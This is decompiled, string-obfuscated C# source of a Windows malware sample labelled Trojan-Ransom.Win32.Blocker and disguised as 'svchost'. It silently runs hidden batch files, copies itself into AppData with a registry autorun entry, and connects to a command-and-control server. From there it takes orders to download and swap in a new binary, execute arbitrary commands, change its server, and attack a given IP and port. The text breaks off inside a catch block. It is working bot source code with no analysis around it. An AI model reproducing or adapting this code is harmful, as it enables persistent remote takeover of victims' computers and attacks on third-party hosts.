// Decompiled with JetBrains decompiler
// Type: .
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A84E1C60-991C-4851-A992-6DDCEE4404E1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.hdyy-931caaeaf6cae2b133cd58c62d9087f042c19135bf73182da90df199b94515c7.exe

using \u0002;
using \u0003;
using \u0004;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace \u0003
{
  internal sealed class \u0002 : Form
  {
    public int \u0001 = 36729;
    public float \u0001 = 2f;
    public Thread \u0001;
    public IPEndPoint \u0001;
    public Socket \u0001 = (Socket) null;
    public NetworkStream \u0001;
    public bool \u0001 = false;
    private List<Thread> \u0001;
    private bool \u0002 = false;
    private byte[] \u0001;
    private IPEndPoint \u0002;
    public string \u0001 = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    public string \u0002 = Path.GetFileName(Application.ExecutablePath);
    public string \u0003 = Application.ExecutablePath;
    public string \u0004 = Application.StartupPath;
    public static string \u0005 = \u0001.\u0002(104);
    public static int \u0002 = -1;
    public static bool \u0003 = false;
    public static List<byte> \u0001 = new List<byte>();
    private Thread \u0002;
    private string \u0006 = \u0001.\u0002(104);
    private static Dictionary<string, CookieContainer> \u0001 = new Dictionary<string, CookieContainer>();
    private Thread \u0003;
    private IContainer \u0001 = (IContainer) null;

    public \u0002(string[] args) => this.\u0008();

    public static void \u0002()
    {
      \u0003.\u0002.\u0005 = \u0001.\u0002(104);
      \u0003.\u0002.\u0001.Clear();
      \u0003.\u0002.\u0003 = false;
      \u0003.\u0002.\u0002 = -1;
    }

    private void \u0002(object sender, EventArgs e)
    {
      this.\u0006 = \u0003.\u0002.\u0002(\u0002.\u0003.Default.DNS);
      this.\u0006 = this.\u0006.Replace(\u0001.\u0002(134), \u0001.\u0002(104));
      this.\u0006 = this.\u0006.Replace(\u0001.\u0002(139), \u0001.\u0002(104));
      this.\u0006 = this.\u0006.Replace(\u0001.\u0002(144), \u0001.\u0002(104));
      this.\u0006 = this.\u0006.Replace(\u0001.\u0002(149), \u0001.\u0002(104));
      this.\u0006 = this.\u0006.Trim();
      string str1 = \u0001.\u0002(154);
      string str2 = Path.GetTempPath() + \u0001.\u0002(304);
      StreamWriter streamWriter1 = new StreamWriter(str2);
      streamWriter1.WriteLine(\u0001.\u0002(329));
      streamWriter1.WriteLine(str1);
      streamWriter1.Flush();
      streamWriter1.Close();
      Process.Start(new ProcessStartInfo(str2)
      {
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden
      });
      ProcessStartInfo processStartInfo = (ProcessStartInfo) null;
      string str3 = \u0001.\u0002(342) + this.\u0002 + \u0001.\u0002(403) + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0001.\u0002(452) + this.\u0002 + \u0001.\u0002(457);
      string str4 = Path.GetTempPath() + \u0001.\u0002(526);
      StreamWriter streamWriter2 = new StreamWriter(str4);
      streamWriter2.WriteLine(\u0001.\u0002(329));
      streamWriter2.WriteLine(str3);
      streamWriter2.Flush();
      streamWriter2.Close();
      Process.Start(new ProcessStartInfo(str4)
      {
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden
      });
      processStartInfo = (ProcessStartInfo) null;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0001.\u0002(551), true);
      if (registryKey.GetValue(\u0001.\u0002(612)) == null)
        registryKey.SetValue(\u0001.\u0002(612), (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0001.\u0002(452) + this.\u0002));
      if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0001.\u0002(452) + this.\u0002))
        System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0001.\u0002(452) + this.\u0002, false);
      this.\u0001 = new IPEndPoint(Dns.GetHostAddresses(this.\u0006)[0], this.\u0001);
      this.\u0001 = new Thread(new ThreadStart(this.\u0003));
      this.\u0001.IsBackground = true;
      this.\u0001.Priority = ThreadPriority.Highest;
      this.\u0002(true);
    }

    public static string \u0002(string str)
    {
      string str1 = \u0001.\u0002(104);
      foreach (char ch in str.ToCharArray())
      {
        string str2 = ch.ToString();
        string key = str2;
        if (key != null)
        {
          // ISSUE: reference to a compiler-generated field
          if (\u0001.\u0001 == null)
          {
            // ISSUE: reference to a compiler-generated field
            \u0001.\u0001 = new Dictionary<string, int>(89)
            {
              {
                \u0001.\u0002(625),
                0
              },
              {
                \u0001.\u0002(630),
                1
              },
              {
                \u0001.\u0002(635),
                2
              },
              {
                \u0001.\u0002(640),
                3
              },
              {
                \u0001.\u0002(645),
                4
              },
              {
                \u0001.\u0002(650),
                5
              },
              {
                \u0001.\u0002(655),
                6
              },
              {
                \u0001.\u0002(660),
                7
              },
              {
                \u0001.\u0002(665),
                8
              },
              {
                \u0001.\u0002(670),
                9
              },
              {
                \u0001.\u0002(675),
                10
              },
              {
                \u0001.\u0002(680),
                11
              },
              {
                \u0001.\u0002(685),
                12
              },
              {
                \u0001.\u0002(690),
                13
              },
              {
                \u0001.\u0002(695),
                14
              },
              {
                \u0001.\u0002(700),
                15
              },
              {
                \u0001.\u0002(705),
                16
              },
              {
                \u0001.\u0002(710),
                17
              },
              {
                \u0001.\u0002(715),
                18
              },
              {
                \u0001.\u0002(720),
                19
              },
              {
                \u0001.\u0002(725),
                20
              },
              {
                \u0001.\u0002(730),
                21
              },
              {
                \u0001.\u0002(735),
                22
              },
              {
                \u0001.\u0002(740),
                23
              },
              {
                \u0001.\u0002(745),
                24
              },
              {
                \u0001.\u0002(750),
                25
              },
              {
                \u0001.\u0002(755),
                26
              },
              {
                \u0001.\u0002(760),
                27
              },
              {
                \u0001.\u0002(765),
                28
              },
              {
                \u0001.\u0002(770),
                29
              },
              {
                \u0001.\u0002(775),
                30
              },
              {
                \u0001.\u0002(780),
                31
              },
              {
                \u0001.\u0002(785),
                32
              },
              {
                \u0001.\u0002(790),
                33
              },
              {
                \u0001.\u0002(795),
                34
              },
              {
                \u0001.\u0002(800),
                35
              },
              {
                \u0001.\u0002(805),
                36
              },
              {
                \u0001.\u0002(810),
                37
              },
              {
                \u0001.\u0002(815),
                38
              },
              {
                \u0001.\u0002(820),
                39
              },
              {
                \u0001.\u0002(825),
                40
              },
              {
                \u0001.\u0002(830),
                41
              },
              {
                \u0001.\u0002(835),
                42
              },
              {
                \u0001.\u0002(840),
                43
              },
              {
                \u0001.\u0002(845),
                44
              },
              {
                \u0001.\u0002(850),
                45
              },
              {
                \u0001.\u0002(855),
                46
              },
              {
                \u0001.\u0002(860),
                47
              },
              {
                \u0001.\u0002(865),
                48
              },
              {
                \u0001.\u0002(870),
                49
              },
              {
                \u0001.\u0002(875),
                50
              },
              {
                \u0001.\u0002(880),
                51
              },
              {
                \u0001.\u0002(885),
                52
              },
              {
                \u0001.\u0002(890),
                53
              },
              {
                \u0001.\u0002(139),
                54
              },
              {
                \u0001.\u0002(895),
                55
              },
              {
                \u0001.\u0002(900),
                56
              },
              {
                \u0001.\u0002(905),
                57
              },
              {
                \u0001.\u0002(910),
                58
              },
              {
                \u0001.\u0002(129),
                59
              },
              {
                \u0001.\u0002(915),
                60
              },
              {
                \u0001.\u0002(920),
                61
              },
              {
                \u0001.\u0002(925),
                62
              },
              {
                \u0001.\u0002(930),
                63
              },
              {
                \u0001.\u0002(935),
                64
              },
              {
                \u0001.\u0002(940),
                65
              },
              {
                \u0001.\u0002(945),
                66
              },
              {
                \u0001.\u0002(144),
                67
              },
              {
                \u0001.\u0002(124),
                68
              },
              {
                \u0001.\u0002(950),
                69
              },
              {
                \u0001.\u0002(955),
                70
              },
              {
                \u0001.\u0002(960),
                71
              },
              {
                \u0001.\u0002(965),
                72
              },
              {
                \u0001.\u0002(970),
                73
              },
              {
                \u0001.\u0002(975),
                74
              },
              {
                \u0001.\u0002(980),
                75
              },
              {
                \u0001.\u0002(985),
                76
              },
              {
                \u0001.\u0002(134),
                77
              },
              {
                \u0001.\u0002(990),
                78
              },
              {
                \u0001.\u0002(995),
                79
              },
              {
                \u0001.\u0002(1000),
                80
              },
              {
                \u0001.\u0002(1005),
                81
              },
              {
                \u0001.\u0002(1010),
                82
              },
              {
                \u0001.\u0002(1015),
                83
              },
              {
                \u0001.\u0002(1020),
                84
              },
              {
                \u0001.\u0002(1025),
                85
              },
              {
                \u0001.\u0002(1030),
                86
              },
              {
                \u0001.\u0002(1035),
                87
              },
              {
                \u0001.\u0002(1040),
                88
              }
            };
          }
          int num;
          // ISSUE: reference to a compiler-generated field
          // ISSUE: explicit non-virtual call
          if (__nonvirtual (\u0001.\u0001.TryGetValue(key, out num)))
          {
            switch (num)
            {
              case 0:
                str1 += \u0001.\u0002(680);
                continue;
              case 1:
                str1 += \u0001.\u0002(660);
                continue;
              case 2:
                str1 += \u0001.\u0002(650);
                continue;
              case 3:
                str1 += \u0001.\u0002(720);
                continue;
              case 4:
                str1 += \u0001.\u0002(735);
                continue;
              case 5:
                str1 += \u0001.\u0002(700);
                continue;
              case 6:
                str1 += \u0001.\u0002(655);
                continue;
              case 7:
                str1 += \u0001.\u0002(740);
                continue;
              case 8:
                str1 += \u0001.\u0002(635);
                continue;
              case 9:
                str1 += \u0001.\u0002(730);
                continue;
              case 10:
                str1 += \u0001.\u0002(705);
                continue;
              case 11:
                str1 += \u0001.\u0002(675);
                continue;
              case 12:
                str1 += \u0001.\u0002(750);
                continue;
              case 13:
                str1 += \u0001.\u0002(670);
                continue;
              case 14:
                str1 += \u0001.\u0002(715);
                continue;
              case 15:
                str1 += \u0001.\u0002(640);
                continue;
              case 16:
                str1 += \u0001.\u0002(625);
                continue;
              case 17:
                str1 += \u0001.\u0002(690);
                continue;
              case 18:
                str1 += \u0001.\u0002(725);
                continue;
              case 19:
                str1 += \u0001.\u0002(695);
                continue;
              case 20:
                str1 += \u0001.\u0002(745);
                continue;
              case 21:
                str1 += \u0001.\u0002(630);
                continue;
              case 22:
                str1 += \u0001.\u0002(645);
                continue;
              case 23:
                str1 += \u0001.\u0002(685);
                continue;
              case 24:
                str1 += \u0001.\u0002(665);
                continue;
              case 25:
                str1 += \u0001.\u0002(710);
                continue;
              case 26:
                str1 += \u0001.\u0002(865);
                continue;
              case 27:
                str1 += \u0001.\u0002(830);
                continue;
              case 28:
                str1 += \u0001.\u0002(800);
                continue;
              case 29:
                str1 += \u0001.\u0002(760);
                continue;
              case 30:
                str1 += \u0001.\u0002(835);
                continue;
              case 31:
                str1 += \u0001.\u0002(860);
                continue;
              case 32:
                str1 += \u0001.\u0002(785);
                continue;
              case 33:
                str1 += \u0001.\u0002(845);
                continue;
              case 34:
                str1 += \u0001.\u0002(755);
                continue;
              case 35:
                str1 += \u0001.\u0002(765);
                continue;
              case 36:
                str1 += \u0001.\u0002(840);
                continue;
              case 37:
                str1 += \u0001.\u0002(770);
                continue;
              case 38:
                str1 += \u0001.\u0002(850);
                continue;
              case 39:
                str1 += \u0001.\u0002(875);
                continue;
              case 40:
                str1 += \u0001.\u0002(870);
                continue;
              case 41:
                str1 += \u0001.\u0002(825);
                continue;
              case 42:
                str1 += \u0001.\u0002(805);
                continue;
              case 43:
                str1 += \u0001.\u0002(880);
                continue;
              case 44:
                str1 += \u0001.\u0002(795);
                continue;
              case 45:
                str1 += \u0001.\u0002(820);
                continue;
              case 46:
                str1 += \u0001.\u0002(790);
                continue;
              case 47:
                str1 += \u0001.\u0002(810);
                continue;
              case 48:
                str1 += \u0001.\u0002(775);
                continue;
              case 49:
                str1 += \u0001.\u0002(815);
                continue;
              case 50:
                str1 += \u0001.\u0002(855);
                continue;
              case 51:
                str1 += \u0001.\u0002(780);
                continue;
              case 52:
                str1 += \u0001.\u0002(129);
                continue;
              case 53:
                str1 += \u0001.\u0002(985);
                continue;
              case 54:
                str1 += \u0001.\u0002(144);
                continue;
              case 55:
                str1 += \u0001.\u0002(970);
                continue;
              case 56:
                str1 += \u0001.\u0002(920);
                continue;
              case 57:
                str1 += \u0001.\u0002(990);
                continue;
              case 58:
                str1 += \u0001.\u0002(935);
                continue;
              case 59:
                str1 += \u0001.\u0002(910);
                continue;
              case 60:
                str1 += \u0001.\u0002(955);
                continue;
              case 61:
                str1 += \u0001.\u0002(965);
                continue;
              case 62:
                str1 += \u0001.\u0002(900);
                continue;
              case 63:
                str1 += \u0001.\u0002(885);
                continue;
              case 64:
                str1 += \u0001.\u0002(890);
                continue;
              case 65:
                str1 += \u0001.\u0002(915);
                continue;
              case 66:
                str1 += \u0001.\u0002(960);
                continue;
              case 67:
                str1 += \u0001.\u0002(134);
                continue;
              case 68:
                str1 += \u0001.\u0002(980);
                continue;
              case 69:
                str1 += \u0001.\u0002(895);
                continue;
              case 70:
                str1 += \u0001.\u0002(940);
                continue;
              case 71:
                str1 += \u0001.\u0002(925);
                continue;
              case 72:
                str1 += \u0001.\u0002(124);
                continue;
              case 73:
                str1 += \u0001.\u0002(975);
                continue;
              case 74:
                str1 += \u0001.\u0002(930);
                continue;
              case 75:
                str1 += \u0001.\u0002(945);
                continue;
              case 76:
                str1 += \u0001.\u0002(950);
                continue;
              case 77:
                str1 += \u0001.\u0002(905);
                continue;
              case 78:
                str1 += \u0001.\u0002(139);
                continue;
              case 79:
                str1 += \u0001.\u0002(1040);
                continue;
              case 80:
                str1 += \u0001.\u0002(1025);
                continue;
              case 81:
                str1 += \u0001.\u0002(1020);
                continue;
              case 82:
                str1 += \u0001.\u0002(1010);
                continue;
              case 83:
                str1 += \u0001.\u0002(1030);
                continue;
              case 84:
                str1 += \u0001.\u0002(1000);
                continue;
              case 85:
                str1 += \u0001.\u0002(1035);
                continue;
              case 86:
                str1 += \u0001.\u0002(1005);
                continue;
              case 87:
                str1 += \u0001.\u0002(995);
                continue;
              case 88:
                str1 += \u0001.\u0002(1015);
                continue;
            }
          }
        }
        str1 += str2;
      }
      return str1;
    }

    public static string \u0003(string str)
    {
      string str1 = \u0001.\u0002(104);
      foreach (char ch in str.ToCharArray())
      {
        string str2 = ch.ToString();
        string key = str2;
        if (key != null)
        {
          // ISSUE: reference to a compiler-generated field
          if (\u0001.\u0002 == null)
          {
            // ISSUE: reference to a compiler-generated field
            \u0001.\u0002 = new Dictionary<string, int>(89)
            {
              {
                \u0001.\u0002(680),
                0
              },
              {
                \u0001.\u0002(660),
                1
              },
              {
                \u0001.\u0002(650),
                2
              },
              {
                \u0001.\u0002(720),
                3
              },
              {
                \u0001.\u0002(735),
                4
              },
              {
                \u0001.\u0002(700),
                5
              },
              {
                \u0001.\u0002(655),
                6
              },
              {
                \u0001.\u0002(740),
                7
              },
              {
                \u0001.\u0002(635),
                8
              },
              {
                \u0001.\u0002(730),
                9
              },
              {
                \u0001.\u0002(705),
                10
              },
              {
                \u0001.\u0002(675),
                11
              },
              {
                \u0001.\u0002(750),
                12
              },
              {
                \u0001.\u0002(670),
                13
              },
              {
                \u0001.\u0002(715),
                14
              },
              {
                \u0001.\u0002(640),
                15
              },
              {
                \u0001.\u0002(625),
                16
              },
              {
                \u0001.\u0002(690),
                17
              },
              {
                \u0001.\u0002(725),
                18
              },
              {
                \u0001.\u0002(695),
                19
              },
              {
                \u0001.\u0002(745),
                20
              },
              {
                \u0001.\u0002(630),
                21
              },
              {
                \u0001.\u0002(645),
                22
              },
              {
                \u0001.\u0002(685),
                23
              },
              {
                \u0001.\u0002(665),
                24
              },
              {
                \u0001.\u0002(710),
                25
              },
              {
                \u0001.\u0002(865),
                26
              },
              {
                \u0001.\u0002(830),
                27
              },
              {
                \u0001.\u0002(800),
                28
              },
              {
                \u0001.\u0002(760),
                29
              },
              {
                \u0001.\u0002(835),
                30
              },
              {
                \u0001.\u0002(860),
                31
              },
              {
                \u0001.\u0002(785),
                32
              },
              {
                \u0001.\u0002(845),
                33
              },
              {
                \u0001.\u0002(755),
                34
              },
              {
                \u0001.\u0002(765),
                35
              },
              {
                \u0001.\u0002(840),
                36
              },
              {
                \u0001.\u0002(770),
                37
              },
              {
                \u0001.\u0002(850),
                38
              },
              {
                \u0001.\u0002(875),
                39
              },
              {
                \u0001.\u0002(870),
                40
              },
              {
                \u0001.\u0002(825),
                41
              },
              {
                \u0001.\u0002(805),
                42
              },
              {
                \u0001.\u0002(880),
                43
              },
              {
                \u0001.\u0002(795),
                44
              },
              {
                \u0001.\u0002(820),
                45
              },
              {
                \u0001.\u0002(790),
                46
              },
              {
                \u0001.\u0002(810),
                47
              },
              {
                \u0001.\u0002(775),
                48
              },
              {
                \u0001.\u0002(815),
                49
              },
              {
                \u0001.\u0002(855),
                50
              },
              {
                \u0001.\u0002(780),
                51
              },
              {
                \u0001.\u0002(129),
                52
              },
              {
                \u0001.\u0002(985),
                53
              },
              {
                \u0001.\u0002(144),
                54
              },
              {
                \u0001.\u0002(970),
                55
              },
              {
                \u0001.\u0002(920),
                56
              },
              {
                \u0001.\u0002(990),
                57
              },
              {
                \u0001.\u0002(935),
                58
              },
              {
                \u0001.\u0002(910),
                59
              },
              {
                \u0001.\u0002(955),
                60
              },
              {
                \u0001.\u0002(965),
                61
              },
              {
                \u0001.\u0002(900),
                62
              },
              {
                \u0001.\u0002(885),
                63
              },
              {
                \u0001.\u0002(890),
                64
              },
              {
                \u0001.\u0002(915),
                65
              },
              {
                \u0001.\u0002(960),
                66
              },
              {
                \u0001.\u0002(134),
                67
              },
              {
                \u0001.\u0002(980),
                68
              },
              {
                \u0001.\u0002(895),
                69
              },
              {
                \u0001.\u0002(940),
                70
              },
              {
                \u0001.\u0002(925),
                71
              },
              {
                \u0001.\u0002(124),
                72
              },
              {
                \u0001.\u0002(975),
                73
              },
              {
                \u0001.\u0002(930),
                74
              },
              {
                \u0001.\u0002(945),
                75
              },
              {
                \u0001.\u0002(950),
                76
              },
              {
                \u0001.\u0002(905),
                77
              },
              {
                \u0001.\u0002(139),
                78
              },
              {
                \u0001.\u0002(1040),
                79
              },
              {
                \u0001.\u0002(1025),
                80
              },
              {
                \u0001.\u0002(1020),
                81
              },
              {
                \u0001.\u0002(1010),
                82
              },
              {
                \u0001.\u0002(1030),
                83
              },
              {
                \u0001.\u0002(1000),
                84
              },
              {
                \u0001.\u0002(1035),
                85
              },
              {
                \u0001.\u0002(1005),
                86
              },
              {
                \u0001.\u0002(995),
                87
              },
              {
                \u0001.\u0002(1015),
                88
              }
            };
          }
          int num;
          // ISSUE: reference to a compiler-generated field
          // ISSUE: explicit non-virtual call
          if (__nonvirtual (\u0001.\u0002.TryGetValue(key, out num)))
          {
            switch (num)
            {
              case 0:
                str1 += \u0001.\u0002(625);
                continue;
              case 1:
                str1 += \u0001.\u0002(630);
                continue;
              case 2:
                str1 += \u0001.\u0002(635);
                continue;
              case 3:
                str1 += \u0001.\u0002(640);
                continue;
              case 4:
                str1 += \u0001.\u0002(645);
                continue;
              case 5:
                str1 += \u0001.\u0002(650);
                continue;
              case 6:
                str1 += \u0001.\u0002(655);
                continue;
              case 7:
                str1 += \u0001.\u0002(660);
                continue;
              case 8:
                str1 += \u0001.\u0002(665);
                continue;
              case 9:
                str1 += \u0001.\u0002(670);
                continue;
              case 10:
                str1 += \u0001.\u0002(675);
                continue;
              case 11:
                str1 += \u0001.\u0002(680);
                continue;
              case 12:
                str1 += \u0001.\u0002(685);
                continue;
              case 13:
                str1 += \u0001.\u0002(690);
                continue;
              case 14:
                str1 += \u0001.\u0002(695);
                continue;
              case 15:
                str1 += \u0001.\u0002(700);
                continue;
              case 16:
                str1 += \u0001.\u0002(705);
                continue;
              case 17:
                str1 += \u0001.\u0002(710);
                continue;
              case 18:
                str1 += \u0001.\u0002(715);
                continue;
              case 19:
                str1 += \u0001.\u0002(720);
                continue;
              case 20:
                str1 += \u0001.\u0002(725);
                continue;
              case 21:
                str1 += \u0001.\u0002(730);
                continue;
              case 22:
                str1 += \u0001.\u0002(735);
                continue;
              case 23:
                str1 += \u0001.\u0002(740);
                continue;
              case 24:
                str1 += \u0001.\u0002(745);
                continue;
              case 25:
                str1 += \u0001.\u0002(750);
                continue;
              case 26:
                str1 += \u0001.\u0002(755);
                continue;
              case 27:
                str1 += \u0001.\u0002(760);
                continue;
              case 28:
                str1 += \u0001.\u0002(765);
                continue;
              case 29:
                str1 += \u0001.\u0002(770);
                continue;
              case 30:
                str1 += \u0001.\u0002(775);
                continue;
              case 31:
                str1 += \u0001.\u0002(780);
                continue;
              case 32:
                str1 += \u0001.\u0002(785);
                continue;
              case 33:
                str1 += \u0001.\u0002(790);
                continue;
              case 34:
                str1 += \u0001.\u0002(795);
                continue;
              case 35:
                str1 += \u0001.\u0002(800);
                continue;
              case 36:
                str1 += \u0001.\u0002(805);
                continue;
              case 37:
                str1 += \u0001.\u0002(810);
                continue;
              case 38:
                str1 += \u0001.\u0002(815);
                continue;
              case 39:
                str1 += \u0001.\u0002(820);
                continue;
              case 40:
                str1 += \u0001.\u0002(825);
                continue;
              case 41:
                str1 += \u0001.\u0002(830);
                continue;
              case 42:
                str1 += \u0001.\u0002(835);
                continue;
              case 43:
                str1 += \u0001.\u0002(840);
                continue;
              case 44:
                str1 += \u0001.\u0002(845);
                continue;
              case 45:
                str1 += \u0001.\u0002(850);
                continue;
              case 46:
                str1 += \u0001.\u0002(855);
                continue;
              case 47:
                str1 += \u0001.\u0002(860);
                continue;
              case 48:
                str1 += \u0001.\u0002(865);
                continue;
              case 49:
                str1 += \u0001.\u0002(870);
                continue;
              case 50:
                str1 += \u0001.\u0002(875);
                continue;
              case 51:
                str1 += \u0001.\u0002(880);
                continue;
              case 52:
                str1 += \u0001.\u0002(885);
                continue;
              case 53:
                str1 += \u0001.\u0002(890);
                continue;
              case 54:
                str1 += \u0001.\u0002(139);
                continue;
              case 55:
                str1 += \u0001.\u0002(895);
                continue;
              case 56:
                str1 += \u0001.\u0002(900);
                continue;
              case 57:
                str1 += \u0001.\u0002(905);
                continue;
              case 58:
                str1 += \u0001.\u0002(910);
                continue;
              case 59:
                str1 += \u0001.\u0002(129);
                continue;
              case 60:
                str1 += \u0001.\u0002(915);
                continue;
              case 61:
                str1 += \u0001.\u0002(920);
                continue;
              case 62:
                str1 += \u0001.\u0002(925);
                continue;
              case 63:
                str1 += \u0001.\u0002(930);
                continue;
              case 64:
                str1 += \u0001.\u0002(935);
                continue;
              case 65:
                str1 += \u0001.\u0002(940);
                continue;
              case 66:
                str1 += \u0001.\u0002(945);
                continue;
              case 67:
                str1 += \u0001.\u0002(144);
                continue;
              case 68:
                str1 += \u0001.\u0002(124);
                continue;
              case 69:
                str1 += \u0001.\u0002(950);
                continue;
              case 70:
                str1 += \u0001.\u0002(955);
                continue;
              case 71:
                str1 += \u0001.\u0002(960);
                continue;
              case 72:
                str1 += \u0001.\u0002(965);
                continue;
              case 73:
                str1 += \u0001.\u0002(970);
                continue;
              case 74:
                str1 += \u0001.\u0002(975);
                continue;
              case 75:
                str1 += \u0001.\u0002(980);
                continue;
              case 76:
                str1 += \u0001.\u0002(985);
                continue;
              case 77:
                str1 += \u0001.\u0002(134);
                continue;
              case 78:
                str1 += \u0001.\u0002(990);
                continue;
              case 79:
                str1 += \u0001.\u0002(995);
                continue;
              case 80:
                str1 += \u0001.\u0002(1000);
                continue;
              case 81:
                str1 += \u0001.\u0002(1005);
                continue;
              case 82:
                str1 += \u0001.\u0002(1010);
                continue;
              case 83:
                str1 += \u0001.\u0002(1015);
                continue;
              case 84:
                str1 += \u0001.\u0002(1020);
                continue;
              case 85:
                str1 += \u0001.\u0002(1025);
                continue;
              case 86:
                str1 += \u0001.\u0002(1030);
                continue;
              case 87:
                str1 += \u0001.\u0002(1035);
                continue;
              case 88:
                str1 += \u0001.\u0002(1040);
                continue;
            }
          }
        }
        str1 += str2;
      }
      return str1;
    }

    public void \u0002(bool firstAttempt)
    {
      while (true)
      {
        try
        {
          this.\u0001 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          this.\u0001.Connect((EndPoint) this.\u0001);
          if (!this.\u0001.Connected)
            break;
          this.\u0001 = new NetworkStream(this.\u0001, true);
          \u0001.\u0002(this.\u0001, \u0001.\u0002(1045), this.\u0001.ToString() + \u0001.\u0002(139) + Environment.OSVersion.Platform.ToString() + \u0001.\u0002(1054) + \u0002.\u0003.Default.Active.ToString());
          if (firstAttempt)
            this.\u0001.Start();
          break;
        }
        catch
        {
        }
      }
    }

    public void \u0003()
    {
      while (true)
      {
        bool flag = true;
        \u0003.\u0002.\u0002();
        try
        {
          if (this.\u0001 != null && this.\u0001.Connected)
          {
            while (true)
            {
              flag = true;
              int num = this.\u0001.ReadByte();
              if (num != -1)
              {
                if (!\u0003.\u0002.\u0003)
                {
                  string str = ((char) num).ToString();
                  if (str == \u0001.\u0002(129))
                    \u0003.\u0002.\u0003 = true;
                  if (str != \u0001.\u0002(105) && str != \u0001.\u0002(129))
                    \u0003.\u0002.\u0005 += str;
                }
                else if (\u0003.\u0002.\u0003)
                {
                  if (\u0003.\u0002.\u0002 == -1)
                  {
                    int startIndex = \u0003.\u0002.\u0005.IndexOf(\u0001.\u0002(124)) + 1;
                    int length = \u0003.\u0002.\u0005.Length;
                    \u0003.\u0002.\u0002 = int.Parse(\u0003.\u0002.\u0005.Substring(startIndex, length - startIndex));
                  }
                  if (\u0003.\u0002.\u0001.Count != \u0003.\u0002.\u0002)
                    \u0003.\u0002.\u0001.Add((byte) num);
                  else
                    break;
                }
              }
              else
                break;
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1059)))
            {
              try
              {
                this.\u0002(\u0001.\u0002(1068));
                try
                {
                  WebClient webClient = new WebClient();
                  byte[] bytes = webClient.DownloadData(webClient.Proxy.GetProxy(new Uri(\u0001.\u0002(1097))));
                  if (System.IO.File.Exists(this.\u0004 + \u0001.\u0002(452) + this.\u0001 + \u0001.\u0002(1170)))
                    System.IO.File.Delete(this.\u0004 + \u0001.\u0002(452) + this.\u0001 + \u0001.\u0002(1170));
                  System.IO.File.Move(this.\u0003, this.\u0004 + \u0001.\u0002(452) + this.\u0001 + \u0001.\u0002(1170));
                  System.IO.File.WriteAllBytes(this.\u0003, bytes);
                  Application.DoEvents();
                  BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(this.\u0003, FileMode.Open, FileAccess.Write));
                  binaryWriter.Seek(int.Parse(\u0001.\u0003(\u0003.\u0002.\u0001.ToArray())), SeekOrigin.Begin);
                  binaryWriter.Write(\u0003.\u0002.\u0003(this.\u0006).ToCharArray());
                  binaryWriter.Flush();
                  binaryWriter.Close();
                  Application.Restart();
                }
                catch
                {
                  this.\u0002(\u0001.\u0002(1179));
                }
              }
              catch
              {
              }
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1204)))
            {
              try
              {
                string str1 = \u0001.\u0003(\u0003.\u0002.\u0001.ToArray());
                string str2 = Path.GetTempPath() + \u0001.\u0002(1213);
                StreamWriter streamWriter = new StreamWriter(str2);
                streamWriter.WriteLine(\u0001.\u0002(329));
                streamWriter.WriteLine(str1);
                streamWriter.Flush();
                streamWriter.Close();
                Process.Start(new ProcessStartInfo(str2)
                {
                  CreateNoWindow = true,
                  WindowStyle = ProcessWindowStyle.Hidden
                });
                this.\u0002(\u0001.\u0002(1230));
              }
              catch
              {
                this.\u0002(\u0001.\u0002(1271));
              }
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1292)))
              this.\u0001 = true;
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1301)))
            {
              this.\u0001.Disconnect(true);
              this.\u0002(false);
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1306)))
            {
              \u0002.\u0003.Default.DNS = \u0003.\u0002.\u0003(\u0001.\u0003(\u0003.\u0002.\u0001.ToArray()));
              \u0002.\u0003.Default.Save();
              Application.Restart();
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1315)))
            {
              \u0002.\u0003.Default.Active = true;
              \u0002.\u0003.Default.Save();
              \u0001.\u0002(this.\u0001, \u0001.\u0002(1324), \u0001.\u0002(1337));
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1346)))
            {
              \u0002.\u0003.Default.Active = false;
              \u0002.\u0003.Default.Save();
              \u0001.\u0002(this.\u0001, \u0001.\u0002(1324), \u0001.\u0002(1359));
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1368)))
            {
              this.\u0002 = false;
              foreach (Thread thread in this.\u0001.ToArray())
                thread.Abort();
              if (this.\u0002 != null)
                this.\u0002.Abort();
              this.\u0002(\u0001.\u0002(1377));
            }
            if (\u0003.\u0002.\u0005.Contains(\u0001.\u0002(1386)))
            {
              if (\u0002.\u0003.Default.Active)
              {
                try
                {
                  \u0001.\u0002(104);
                  \u0001.\u0002(104);
                  \u0001.\u0002(104);
                  \u0001.\u0002(104);
                  string str = \u0001.\u0003(\u0003.\u0002.\u0001.ToArray());
                  int length = str.IndexOf(\u0001.\u0002(139));
                  int num1 = str.IndexOf(\u0001.\u0002(905));
                  int num2 = str.IndexOf(\u0001.\u0002(1054));
                  string Type = str.Substring(0, length);
                  string Force = str.Substring(length + 1, num1 - (length + 1));
                  string ipString = str.Substring(num1 + 1, num2 - (num1 + 1));
                  string s = str.Substring(num2 + 1, str.Length - (num2 + 1));
                  this.\u0002(Type, Force, new IPEndPoint(IPAddress.Parse(ipString), int.Parse(s)));
                }
                catch
                {
